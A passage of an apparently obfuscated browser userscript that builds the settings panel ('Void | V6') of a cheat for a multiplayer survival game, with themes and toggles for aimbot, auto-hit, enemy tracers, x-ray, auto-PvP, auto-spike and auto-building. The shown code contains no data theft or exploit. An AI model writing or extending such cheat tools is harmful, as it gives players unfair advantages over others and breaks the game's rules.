    if (o !== -1) {
      let l = i[o];
      Object.defineProperty(e, t, {
        get() {
          return this[l];
        },
        set(e) {
          this[l] = e;
        }
      });
    } else {
      console.log("Cannot extract: " + t + " from ", e);
    }
  });
}
function a0ENDFile(e, t) {
  let i = 0;
  for (let $ in e) {
    if (Object.prototype.hasOwnProperty.call(e, $)) {
      let o = e[$];
      if (t(o, i)) {
        return o;
      }
    }
    i++;
  }
}
const a0CACHedata = {
  Default: "\n    :root {\n      --tp-base-background-color: hsla(230, 7%, 17%, 1.00);\n      --tp-base-shadow-color: hsla(0, 0%, 0%, 0.2);\n      --tp-button-background-color: hsla(230, 7%, 70%, 1.00);\n      --tp-button-background-color-active: hsla(230, 7%, 85%, 1.00);\n      --tp-button-background-color-focus: hsla(230, 7%, 80%, 1.00);\n      --tp-button-background-color-hover: hsla(230, 7%, 75%, 1.00);\n      --tp-button-foreground-color: hsla(230, 7%, 17%, 1.00);\n      --tp-container-background-color: hsla(230, 7%, 75%, 0.10);\n      --tp-container-background-color-active: hsla(230, 7%, 75%, 0.25);\n      --tp-container-background-color-focus: hsla(230, 7%, 75%, 0.20);\n      --tp-container-background-color-hover: hsla(230, 7%, 75%, 0.15);\n      --tp-container-foreground-color: hsla(230, 7%, 75%, 1.00);\n      --tp-groove-foreground-color: hsla(230, 7%, 75%, 0.10);\n      --tp-input-background-color: hsla(230, 7%, 75%, 0.10);\n      --tp-input-background-color-active: hsla(230, 7%, 75%, 0.25);\n      --tp-input-background-color-focus: hsla(230, 7%, 75%, 0.20);\n      --tp-input-background-color-hover: hsla(230, 7%, 75%, 0.15);\n      --tp-input-foreground-color: hsla(230, 7%, 75%, 1.00);\n      --tp-label-foreground-color: hsla(230, 7%, 75%, 0.70);\n      --tp-monitor-background-color: hsla(230, 7%, 0%, 0.20);\n      --tp-monitor-foreground-color: hsla(230, 7%, 75%, 0.70);\n    }\n\n    /* Áp dụng font cho toàn bộ phần tử trong tp container */\n    .tp-dfw, .tp-lblv, .tp-lbl, .tp-rotv, .tp-btnv, .tp-txtv, .tp-numv, .tp-mntv {\n      font-family: 'Baloo Paaji', cursive !important;\n      font-size: " + a0JUMPfile.Gui.fontSize + "px !important;\n    }\n  ",
  Iceberg: "\n    :root {\n      --tp-base-background-color: hsla(230, 20%, 11%, 1);\n      --tp-base-shadow-color: hsla(0, 0%, 0%, 0.2);\n      --tp-button-background-color: hsla(230, 10%, 80%, 1);\n      --tp-button-background-color-active: hsla(230, 10%, 95%, 1);\n      --tp-button-background-color-focus: hsla(230, 10%, 90%, 1);\n      --tp-button-background-color-hover: hsla(230, 10%, 85%, 1);\n      --tp-button-foreground-color: hsla(230, 20%, 11%, 1);\n      --tp-container-background-color: hsla(230, 25%, 16%, 1);\n      --tp-container-background-color-active: hsla(230, 25%, 31%, 1);\n      --tp-container-background-color-focus: hsla(230, 25%, 26%, 1);\n      --tp-container-background-color-hover: hsla(230, 25%, 21%, 1);\n      --tp-container-foreground-color: hsla(230, 10%, 80%, 1);\n      --tp-groove-foreground-color: hsla(230, 25%, 16%, 1);\n      --tp-input-background-color: hsla(230, 20%, 8%, 1);\n      --tp-input-background-color-active: hsla(230, 28%, 23%, 1);\n      --tp-input-background-color-focus: hsla(230, 28%, 18%, 1);\n      --tp-input-background-color-hover: hsla(230, 20%, 13%, 1);\n      --tp-input-foreground-color: hsla(230, 10%, 80%, 1);\n      --tp-label-foreground-color: hsla(230, 12%, 48%, 1);\n      --tp-monitor-background-color: hsla(230, 20%, 8%, 1);\n      --tp-monitor-foreground-color: hsla(230, 12%, 48%, 1);\n    }\n\n    /* Áp dụng font cho toàn bộ phần tử trong tp container */\n    .tp-dfw, .tp-lblv, .tp-lbl, .tp-rotv, .tp-btnv, .tp-txtv, .tp-numv, .tp-mntv {\n      font-family: 'Baloo Paaji', cursive !important;\n      font-size: " + a0JUMPfile.Gui.fontSize + "px !important;\n    }\n  ",
  Jetblack: "\n    :root {\n      --tp-base-background-color: hsla(0, 0%, 0%, 1);\n      --tp-base-shadow-color: hsla(0, 0%, 0%, 0.2);\n      --tp-button-background-color: hsla(0, 0%, 70%, 1);\n      --tp-button-background-color-active: hsla(0, 0%, 85%, 1);\n      --tp-button-background-color-focus: hsla(0, 0%, 80%, 1);\n      --tp-button-background-color-hover: hsla(0, 0%, 75%, 1);\n      --tp-button-foreground-color: hsla(0, 0%, 0%, 1);\n      --tp-container-background-color: hsla(0, 0%, 10%, 1);\n      --tp-container-background-color-active: hsla(0, 0%, 25%, 1);\n      --tp-container-background-color-focus: hsla(0, 0%, 20%, 1);\n      --tp-container-background-color-hover: hsla(0, 0%, 15%, 1);\n      --tp-container-foreground-color: hsla(0, 0%, 50%, 1);\n      --tp-groove-foreground-color: hsla(0, 0%, 10%, 1);\n      --tp-input-background-color: hsla(0, 0%, 10%, 1);\n      --tp-input-background-color-active: hsla(0, 0%, 25%, 1);\n      --tp-input-background-color-focus: hsla(0, 0%, 20%, 1);\n      --tp-input-background-color-hover: hsla(0, 0%, 15%, 1);\n      --tp-input-foreground-color: hsla(0, 0%, 70%, 1);\n      --tp-label-foreground-color: hsla(0, 0%, 50%, 1);\n      --tp-monitor-background-color: hsla(0, 0%, 8%, 1);\n      --tp-monitor-foreground-color: hsla(0, 0%, 48%, 1);\n    }\n    /* Áp dụng font cho toàn bộ phần tử trong tp container */\n    .tp-dfw, .tp-lblv, .tp-lbl, .tp-rotv, .tp-btnv, .tp-txtv, .tp-numv, .tp-mntv {\n      font-family: 'Baloo Paaji', cursive !important;\n      font-size: " + a0JUMPfile.Gui.fontSize + "px !important;\n    }\n  ",
  Light: "\n    :root {\n      --tp-base-background-color: hsla(230, 5%, 90%, 1.00);\n      --tp-base-shadow-color: hsla(0, 0%, 0%, 0.10);\n      --tp-button-background-color: hsla(230, 7%, 75%, 1.00);\n      --tp-button-background-color-active: hsla(230, 7%, 60%, 1.00);\n      --tp-button-background-color-focus: hsla(230, 7%, 65%, 1.00);\n      --tp-button-background-color-hover: hsla(230, 7%, 70%, 1.00);\n      --tp-button-foreground-color: hsla(230, 10%, 30%, 1.00);\n      --tp-container-background-color: hsla(230, 15%, 30%, 0.20);\n      --tp-container-background-color-active: hsla(230, 15%, 30%, 0.32);\n      --tp-container-background-color-focus: hsla(230, 15%, 30%, 0.28);\n      --tp-container-background-color-hover: hsla(230, 15%, 30%, 0.24);\n      --tp-container-foreground-color: hsla(230, 10%, 30%, 1.00);\n      --tp-groove-foreground-color: hsla(230, 15%, 30%, 0.20);\n      --tp-input-background-color: hsla(230, 15%, 30%, 0.10);\n      --tp-input-background-color-active: hsla(230, 15%, 30%, 0.22);\n      --tp-input-background-color-focus: hsla(230, 15%, 30%, 0.18);\n      --tp-input-background-color-hover: hsla(230, 15%, 30%, 0.14);\n      --tp-input-foreground-color: hsla(230, 10%, 30%, 1.00);\n      --tp-label-foreground-color: hsla(230, 10%, 30%, 0.70);\n      --tp-monitor-background-color: hsla(230, 15%, 30%, 0.10);\n      --tp-monitor-foreground-color: hsla(230, 10%, 30%, 0.50);\n    }\n    /* Áp dụng font cho toàn bộ phần tử trong tp container */\n    .tp-dfw, .tp-lblv, .tp-lbl, .tp-rotv, .tp-btnv, .tp-txtv, .tp-numv, .tp-mntv {\n      font-family: 'Baloo Paaji', cursive !important;\n      font-size: " + a0JUMPfile.Gui.fontSize + "px !important;\n    }\n  ",
  Retro: "\n    :root {\n      --tp-base-background-color: hsla(40, 3%, 90%, 1.00);\n      --tp-base-shadow-color: hsla(0, 0%, 0%, 0.30);\n      --tp-button-background-color: hsla(40, 3%, 70%, 1.00);\n      --tp-button-background-color-active: hsla(40, 3%, 55%, 1.00);\n      --tp-button-background-color-focus: hsla(40, 3%, 60%, 1.00);\n      --tp-button-background-color-hover: hsla(40, 3%, 65%, 1.00);\n      --tp-button-foreground-color: hsla(40, 3%, 20%, 1.00);\n      --tp-container-background-color: hsla(40, 3%, 70%, 1.00);\n      --tp-container-background-color-active: hsla(40, 3%, 55%, 1.00);\n      --tp-container-background-color-focus: hsla(40, 3%, 60%, 1.00);\n      --tp-container-background-color-hover: hsla(40, 3%, 65%, 1.00);\n      --tp-container-foreground-color: hsla(40, 3%, 20%, 1.00);\n      --tp-groove-foreground-color: hsla(40, 3%, 70%, 1.00);\n      --tp-input-background-color: hsla(120, 3%, 20%, 1.00);\n      --tp-input-background-color-active: hsla(120, 3%, 35%, 1.00);\n      --tp-input-background-color-focus: hsla(120, 3%, 30%, 1.00);\n      --tp-input-background-color-hover: hsla(120, 3%, 25%, 1.00);\n      --tp-input-foreground-color: hsla(120, 40%, 60%, 1.00);\n      --tp-label-foreground-color: hsla(40, 3%, 50%, 1.00);\n      --tp-monitor-background-color: hsla(120, 3%, 20%, 1.00);\n      --tp-monitor-foreground-color: hsla(120, 40%, 60%, 0.80);\n    }\n\n    /* Áp dụng font cho toàn bộ phần tử trong tp container */\n    .tp-dfw, .tp-lblv, .tp-lbl, .tp-rotv, .tp-btnv, .tp-txtv, .tp-numv, .tp-mntv {\n      font-family: 'Baloo Paaji', cursive !important;\n      font-size: " + a0JUMPfile.Gui.fontSize + "px !important;\n    }\n  ",
  Translucent: "\n    :root {\n      --tp-base-background-color: hsla(0, 0%, 10%, 0.80);\n      --tp-base-shadow-color: hsla(0, 0%, 0%, 0.2);\n      --tp-button-background-color: hsla(0, 0%, 80%, 1.00);\n      --tp-button-background-color-active: hsla(0, 0%, 100%, 1.00);\n      --tp-button-background-color-focus: hsla(0, 0%, 95%, 1.00);\n      --tp-button-background-color-hover: hsla(0, 0%, 85%, 1.00);\n      --tp-button-foreground-color: hsla(0, 0%, 0%, 0.80);\n      --tp-container-background-color: hsla(0, 0%, 0%, 0.30);\n      --tp-container-background-color-active: hsla(0, 0%, 0%, 0.60);\n      --tp-container-background-color-focus: hsla(0, 0%, 0%, 0.50);\n      --tp-container-background-color-hover: hsla(0, 0%, 0%, 0.40);\n      --tp-container-foreground-color: hsla(0, 0%, 100%, 0.50);\n      --tp-groove-foreground-color: hsla(0, 0%, 0%, 0.30);\n      --tp-input-background-color: hsla(0, 0%, 0%, 0.30);\n      --tp-input-background-color-active: hsla(0, 0%, 0%, 0.60);\n      --tp-input-background-color-focus: hsla(0, 0%, 0%, 0.50);\n      --tp-input-background-color-hover: hsla(0, 0%, 0%, 0.40);\n      --tp-input-foreground-color: hsla(0, 0%, 100%, 0.50);\n      --tp-label-foreground-color: hsla(0, 0%, 100%, 0.50);\n      --tp-monitor-background-color: hsla(0, 0%, 0%, 0.30);\n      --tp-monitor-foreground-color: hsla(0, 0%, 100%, 0.30);\n    }\n\n    /* Áp dụng font cho toàn bộ phần tử trong tp container */\n    .tp-dfw, .tp-lblv, .tp-lbl, .tp-rotv, .tp-btnv, .tp-txtv, .tp-numv, .tp-mntv {\n      font-family: 'Baloo Paaji', cursive !important;\n      font-size: " + a0JUMPfile.Gui.fontSize + "px !important;\n    }\n  ",
  Vivid: "\n    :root {\n      --tp-base-background-color: hsla(0, 80%, 40%, 1.00);\n      --tp-base-shadow-color: hsla(0, 0%, 0%, 0.2);\n      --tp-button-background-color: hsla(0, 0%, 100%, 1.00);\n      --tp-button-background-color-active: hsla(0, 0%, 85%, 1.00);\n      --tp-button-background-color-focus: hsla(0, 0%, 90%, 1.00);\n      --tp-button-background-color-hover: hsla(0, 0%, 95%, 1.00);\n      --tp-button-foreground-color: hsla(230, 20%, 11%, 1.00);\n      --tp-container-background-color: hsla(0, 0%, 0%, 0.20);\n      --tp-container-background-color-active: hsla(0, 0%, 0%, 0.35);\n      --tp-container-background-color-focus: hsla(0, 0%, 0%, 0.30);\n      --tp-container-background-color-hover: hsla(0, 0%, 0%, 0.25);\n      --tp-container-foreground-color: hsla(0, 0%, 100%, 0.90);\n      --tp-groove-foreground-color: hsla(0, 0%, 0%, 0.20);\n      --tp-input-background-color: hsla(0, 0%, 0%, 0.50);\n      --tp-input-background-color-active: hsla(0, 0%, 0%, 0.65);\n      --tp-input-background-color-focus: hsla(0, 0%, 0%, 0.60);\n      --tp-input-background-color-hover: hsla(0, 0%, 0%, 0.55);\n      --tp-input-foreground-color: hsla(0, 0%, 100%, 0.90);\n      --tp-label-foreground-color: hsla(0, 0%, 100%, 0.90);\n      --tp-monitor-background-color: hsla(0, 0%, 0%, 0.50);\n      --tp-monitor-foreground-color: hsla(0, 0%, 100%, 0.50);\n    }\n\n    /* Áp dụng font cho toàn bộ phần tử trong tp container */\n    .tp-dfw, .tp-lblv, .tp-lbl, .tp-rotv, .tp-btnv, .tp-txtv, .tp-numv, .tp-mntv {\n      font-family: 'Baloo Paaji', cursive !important;\n      font-size: " + a0JUMPfile.Gui.fontSize + "px !important;\n    }\n  "
};
function a0MOUNttext() {
  let e = unsafeWindow.devicePixelRatio;
  let t = document.getElementById("gui-container");
  if (t) {
    Object.assign(t.style, {
      position: "absolute",
      top: "75px",
      left: "calc(100vw - " + 310 / e + "px - " + 10 / e + "px)",
      width: "310px",
      cursor: "move",
      transform: "scale(" + 1 / e + ")",
      transformOrigin: "top left"
    });
  }
}
let a0INSErtpolicy;
let a0ACCEsspayload = {};
let a0DEFErloop = {
  initUI() {
    let e = document.createElement("div");
    e.id = "gui-container";
    document.body.appendChild(e);
    a0MOUNttext();
    unsafeWindow.addEventListener("resize", a0MOUNttext);
    {
      let t = document.createElement("style");
      t.id = "gui-style";
      t.textContent = a0CACHedata[a0JUMPfile.Gui.theme];
      document.head.appendChild(t);
    }
    a0INSErtpolicy = new Tweakpane.Pane({
      title: "Void | V6",
      container: e,
      expanded: true
    });
    {
      let i = document.createElement("button");
      i.id = "togglePaneButton";
      i.style.position = "fixed";
      i.style.top = "0px";
      i.style.right = "0px";
      i.style.width = "12px";
      i.style.height = "12px";
      i.style.backgroundColor = "green";
      i.style.color = "white";
      i.style.border = "none";
      i.style.cursor = "pointer";
      i.style.zIndex = "1001";
      i.style.borderBottomLeftRadius = "4px";
      document.body.appendChild(i);
      i.addEventListener("click", () => {
        a0INSErtpolicy.hidden = !a0INSErtpolicy.hidden;
      });
      unsafeWindow.addEventListener("keydown", e => {
        if (e.code === a0JUMPfile.Gui.k) {
          a0INSErtpolicy.hidden = !a0INSErtpolicy.hidden;
        }
      });
    }
    let $ = a0INSErtpolicy.addFolder({
      title: "🎨 Visuals",
      expanded: false
    });
    {
      let o = $;
      let l = o.addFolder({
        title: "🪟 Gui",
        expanded: false
      });
      {
        let n = l;
        n.addBinding(a0JUMPfile.Gui, "theme", {
          label: "Theme",
          options: {
            Default: "Default",
            Iceberg: "Iceberg",
            Jetblack: "Jetblack",
            Light: "Light",
            Retro: "Retro",
            Translucent: "Translucent",
            Vivid: "Vivid"
          }
        }).on("change", e => {
          let t = document.getElementById("gui-style");
          if (t) {
            t.textContent = a0CACHedata[a0JUMPfile.Gui.theme];
          }
          a0DEFErloop.saveSettings();
        });
        n.addBinding(a0JUMPfile.Gui, "fontSize", {
          label: "Font Size",
          min: 10,
          max: 25,
          step: 1
        }).on("change", e => {
          document.querySelectorAll(".tp-dfw, .tp-lblv, .tp-lbl, .tp-rotv, .tp-btnv, .tp-txtv, .tp-numv, .tp-mntv").forEach(e => {
            e.style.setProperty("font-size", a0JUMPfile.Gui.fontSize + "px", "important");
          });
          a0DEFErloop.saveSettings();
        });
        let s = n.addButton({
          label: "KeyBind",
          title: a0JUMPfile.Gui.k
        }).on("click", () => {
          a0DEFErloop.controls.setKeyBind("Gui", s);
        });
      }
      o.addBinding(a0JUMPfile.ListEnabledHacks, "anchor", {
        options: {
          BottomLeft: "BottomLeft",
          TopLeft: "TopLeft"
        }
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      o.addBinding(a0JUMPfile, "GaugesUI", {
        label: "GaugesUI",
        options: {
          new: "new",
          default: "default"
        }
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      o.addBinding(a0JUMPfile.Roof, "opacity", {
        label: "Roof",
        min: 0.2,
        max: 0.9,
        step: 0.1
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      o.addBinding(a0JUMPfile, "VehicleOpacity", {
        label: "Vehicle",
        min: 0.2,
        max: 1,
        step: 0.1
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      $.addBinding(a0JUMPfile.Xray, "opacity", {
        label: "Xray",
        min: 0.2,
        max: 0.9,
        step: 0.1
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      let r = o.addButton({
        label: "└─ KeyBind",
        title: a0JUMPfile.Xray.k
      }).on("click", () => {
        a0DEFErloop.controls.setKeyBind("Xray", r);
      });
      o.addBinding(a0JUMPfile.BigZoom, "e", {
        label: "BigZoom"
      }).on("change", e => {
        if (e.value === false) {
          a0MERGehandler = false;
          if (a0GETList.socket && a0GETList.socket.readyState === 1) {
            a0GETList.update_cam();
          }
        } else if (unsafeWindow.devicePixelRatio <= 0.5) {
          a0MERGehandler = true;
        }
        a0DEFErloop.saveSettings();
      });
      o.addBinding(a0JUMPfile.ShowRangeOfWeapon, "e", {
        label: "ShowRange"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      o.addBinding(a0JUMPfile.ShowMovement, "e", {
        label: "ShowMovement"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      let c = o.addFolder({
        title: "🧭 Tracers",
        expanded: true
      });
      {
        let O = c;
        O.addBinding(a0JUMPfile.Tracers.target, "teamate", {
          label: "Teammate 🤝"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        O.addBinding(a0JUMPfile.Tracers.target, "enemy", {
          label: "Enemy 👹"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        O.addBinding(a0JUMPfile.Tracers.target, "spider", {
          label: "Spider 🕷️"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        O.addBinding(a0JUMPfile.Tracers.target, "wolf", {
          label: "Wolf 🐺"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        O.addBinding(a0JUMPfile.Tracers.target, "rabbit", {
          label: "Rabbit 🐰"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        O.addBinding(a0JUMPfile.Tracers.target, "hawk", {
          label: "Hawk 🦅"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        O.addBinding(a0JUMPfile.Tracers.target, "kraken", {
          label: "Kraken 🐙"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        O.addBinding(a0JUMPfile.Tracers.target, "sandworm", {
          label: "SandWorm 🐛"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        O.addBinding(a0JUMPfile.Tracers.target, "lavadragon", {
          label: "LavaDragon 🐉"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        O.addBinding(a0JUMPfile.Tracers.target, "goldenchicken", {
          label: "GoldenChicken 🐔"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
      }
      let p = o.addFolder({
        title: "🐞 Debug",
        expanded: false
      });
      {
        let u = p;
        let N = u.addBinding(a0JUMPfile.Debug, "e", {
          label: "Debug Enabled"
        });
        u.addBinding(a0JUMPfile.Debug, "fontSize", {
          label: "Font Size",
          min: 10,
          max: 24,
          step: 1
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        let E = [u.addBlade({
          view: "separator"
        }), u.addBinding(a0JUMPfile.Debug, "showType", {
          label: "type"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        }), u.addBinding(a0JUMPfile.Debug, "showPID", {
          label: "pid"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        }), u.addBinding(a0JUMPfile.Debug, "showID", {
          label: "id"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        }), u.addBinding(a0JUMPfile.Debug, "showInfo", {
          label: "info"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        }), u.addBinding(a0JUMPfile.Debug, "showCoordinates", {
          label: "coor (X, Y)"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        }), u.addBinding(a0JUMPfile.Debug, "showDistance", {
          label: "distance"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        }), u.addBinding(a0JUMPfile.Debug, "showSpeed", {
          label: "speed"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        }), u.addBlade({
          view: "separator"
        }), u.addBinding(a0JUMPfile.Debug, "debugRoof", {
          title: "Roof"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        }), u.addBinding(a0JUMPfile.Debug, "debugBridge", {
          title: "Bridge"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        })];
        let d = e => {
          E.forEach(t => {
            t.disabled = !e;
          });
        };
        N.on("change", e => {
          d(e.value);
          a0DEFErloop.saveSettings();
        });
        d(a0JUMPfile.Debug.e);
      }
    }
    let f = a0INSErtpolicy.addFolder({
      title: "⚔️ Combat",
      expanded: false
    });
    {
      let g = f.addFolder({
        title: "🎯 Aimbot",
        expanded: false
      });
      let A = f.addFolder({
        title: "🌵 AutoSpike",
        expanded: false
      });
      let h = f.addFolder({
        title: "🧱 AutoWall",
        expanded: false
      });
      let R = f.addFolder({
        title: "👾 AutoPvP",
        expanded: false
      });
      {
        g.addBinding(a0JUMPfile.Aimbot, "e", {
          label: "Aimbot Enabled"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        let C = g.addButton({
          title: a0JUMPfile.Aimbot.k,
          label: "KeyBind"
        }).on("click", () => {
          a0DEFErloop.controls.setKeyBind("Aimbot", C);
        });
        g.addBinding(a0JUMPfile.Aimbot, "autoHit", {
          label: "AutoHit"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        g.addBinding(a0JUMPfile.Aimbot, "isSmooth", {
          label: "isSmooth (visual)"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        g.addBinding(a0JUMPfile.Aimbot, "isAimbotGoldenChicken", {
          label: "GoldenChikenAimbot"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        g.addBinding(a0JUMPfile.Aimbot, "isAimbotRabbit", {
          label: "RabbitAimbot"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
      }
      {
        let y = A;
        let m = y.addButton({
          title: a0JUMPfile.AutoSpike.k,
          label: "KeyBind"
        }).on("click", () => {
          a0DEFErloop.controls.setKeyBind("AutoSpike", m);
        });
        y.addBinding(a0JUMPfile.AutoSpike, "IsFollowMouse", {
          label: "MouseAngle"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        y.addBinding(a0JUMPfile.AutoSpike, "AngleSpread", {
          label: "AngleSpread"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        y.addBinding(a0JUMPfile.AutoSpike, "angleSpreadMode", {
          options: {
            Low: "Low",
            Medium: "Medium",
            High: "High",
            360: "360"
          }
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        y.addBinding(a0JUMPfile.AutoSpike, "isSpikeInWater", {
          label: "isSpikeInWater"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
      }
      {
        let M = h;
        let L = M.addButton({
          title: a0JUMPfile.AutoWall.k,
          label: "KeyBind"
        }).on("click", () => {
          a0DEFErloop.controls.setKeyBind("AutoWall", L);
        });
        M.addBinding(a0JUMPfile.AutoWall, "IsFollowMouse", {
          label: "MouseAngle"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        M.addBinding(a0JUMPfile.AutoWall, "AngleSpread", {
          label: "AngleSpread"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
      }
      {
        let P = R;
        let D = P.addButton({
          title: a0JUMPfile.AutoPvP.k,
          label: "KeyBind"
        }).on("click", () => {
          a0DEFErloop.controls.setKeyBind("AutoPvP", D);
        });
        P.addBinding(a0DRAWbuffer, "autopvpLockId", {
          label: "lockId",
          min: 0,
          max: 100,
          step: 1
        });
        P.addBinding(a0JUMPfile.AutoPvP, "isPullWeapon", {
          label: "PullWeapon"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        P.addBinding(a0JUMPfile.AutoPvP, "rangePullWeapon", {
          label: "└─ Range ↔️",
          min: 30,
          max: 250,
          step: 5
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        P.addBinding(a0JUMPfile.AutoPvP, "isPullHelmet", {
          label: "PullHelmet"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        P.addBinding(a0JUMPfile.AutoPvP, "rangePullHelmet", {
          label: "└─ Range ↔️",
          min: 50,
          max: 300,
          step: 5
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        P.addBinding(a0JUMPfile.AutoPvP, "distanceToChase", {
          label: "Distance To Chase ↔️",
          min: 200,
          max: 600,
          step: 10
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        P.addBinding(a0JUMPfile.AutoPvP, "isAutoSpike", {
          label: "AutoSpike"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        P.addBinding(a0JUMPfile.AutoPvP, "minAutoSpikeDistance", {
          min: 0,
          max: 75,
          step: 5,
          label: "├─ Min Dist ↔️"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        P.addBinding(a0JUMPfile.AutoPvP, "maxAutoSpikeDistance", {
          min: 75,
          max: 150,
          step: 5,
          label: "├─ Max Dist ↔️"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        P.addBinding(a0JUMPfile.AutoPvP, "autospikeMode", {
          label: "├─ Mode",
          options: {
            Predict: "Predict",
            DirectionToEnemy: "DirectionToEnemy"
          }
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        P.addBinding(a0JUMPfile.AutoPvP, "is360", {
          label: "├─ is360"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        P.addBinding(a0JUMPfile.AutoPvP, "autoSpikeWhen", {
          label: "└─ When",
          options: {
            PulledGear: "PulledGear",
            InRange: "InRange"
          }
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
      }
    }
    let T = a0INSErtpolicy.addFolder({
      title: "🔰 Main",
      expanded: false
    });
    {
      let _ = T;
      _.addBinding(a0JUMPfile.ExtractorTake, "e", {
        label: "ExtTake"
      });
      let I = _.addButton({
        title: a0JUMPfile.ExtractorTake.k,
        label: "└─ KeyBind"
      }).on("click", e => {
        a0DEFErloop.controls.setKeyBind("ExtractorTake", I);
      });
      _.addBinding(a0JUMPfile.ExtractorPut, "e", {
        label: "ExtPut"
      });
      let S = _.addButton({
        title: a0JUMPfile.ExtractorPut.k,
        label: "└─ KeyBind"
      }).on("click", e => {
        a0DEFErloop.controls.setKeyBind("ExtractorPut", S);
      });
      _.addBinding(a0JUMPfile.AutoBreadTake, "e", {
        label: "BreadTake"
      });
      let k = _.addButton({
        title: a0JUMPfile.AutoBreadTake.k,
        label: "└─ KeyBind"
      }).on("click", e => {
        a0DEFErloop.controls.setKeyBind("AutoBreadTake", k);
      });
      _.addBinding(a0JUMPfile.AutoBreadPut, "e", {
        label: "BreadPut"
      });
      let b = _.addButton({
        title: a0JUMPfile.AutoBreadPut.k,
        label: "└─ KeyBind"
      }).on("click", e => {
        a0DEFErloop.controls.setKeyBind("AutoBreadPut", b);
      });
      _.addBinding(a0JUMPfile.AutoBuild, "e", {
        label: "AutoBuild 🏠"
      });
      let v = _.addButton({
        title: a0JUMPfile.AutoBuild.k,
        label: "└─ KeyBind"
      }).on("click", e => {
        a0DEFErloop.controls.setKeyBind("AutoBuild", v);
      });
      _.addBinding(a0JUMPfile.AutoSeed, "e", {
        label: "AutoSeed 🌱"
      });
      let H = _.addButton({
        title: a0JUMPfile.AutoSeed.k,
        label: "└─ KeyBind"
      }).on("click", e => {
        a0DEFErloop.controls.setKeyBind("AutoSeed", H);
      });
      _.addBinding(a0JUMPfile.AutoIce, "e", {
        label: "AutoIce 🧊"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      _.addBinding(a0JUMPfile.AutoIce, "iceHealTriggerAmount", {
        label: "└─ iceHealAmt",
        min: 0,
        max: 500,
        step: 10
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      _.addBinding(a0JUMPfile.AutoCrown, "e", {
        label: "AutoCrown 👑"
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      _.addBinding(a0JUMPfile.AutoCrown, "health_to_activate", {
        label: "└─ activationHp",
        min: 10,
        max: 200,
        step: 5
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      _.addBinding(a0JUMPfile.AutoCraftSpikes, "e", {
        label: "AutoCraftSpike"
      });
      let U = _.addButton({
        title: a0JUMPfile.AutoCraftSpikes.k,
        label: "├─ KeyBind"
      }).on("click", e => {
        a0DEFErloop.controls.setKeyBind("AutoCraftSpikes", U);
      });
      _.addBinding(a0JUMPfile.AutoCraftSpikes, "p", {
        label: "└─ Mode",
        options: {
          "Highest Craftale": "Highest Craftale",
          "Reidite Spike": "Reidite Spike",
          "Amethyst Spike": "Amethyst Spike",
          "Diamond Spike": "Diamond Spike",
          "Gold Spike": "Gold Spike",
          "Stone Spike": "Stone Spike",
          "Wood Spike": "Wood Spike"
        }
      }).on("change", e => {
        a0DEFErloop.saveSettings();
      });
      let B = _.addFolder({
        title: "AutoChest",
        expanded: false
      });
      {
        let j = B;
        j.addBinding(a0JUMPfile.AutoTakeChest, "e", {
          label: "TakeChest"
        }).on("change", e => {
          a0DEFErloop.saveSettings();
        });
        j.addBinding(a0DRAWbuffer, "invIdToTake", {
          label: "└─ invId",
          min: 0,
          max: 355,
          step: 1
        }).on("change", e => {
          a0JUMPfile.ChestInfo.isShowInvId = true;
          if (a0DEFInestate) {
            workerTimers.clearTimeout(a0DEFInestate);
          }
          a0DEFInestate = workerTimers.setTimeout(() => {
            a0JUMPfile.ChestInfo.isShowInvId = false;
            a0DEFInestate = null;
          }, 10000);
        });
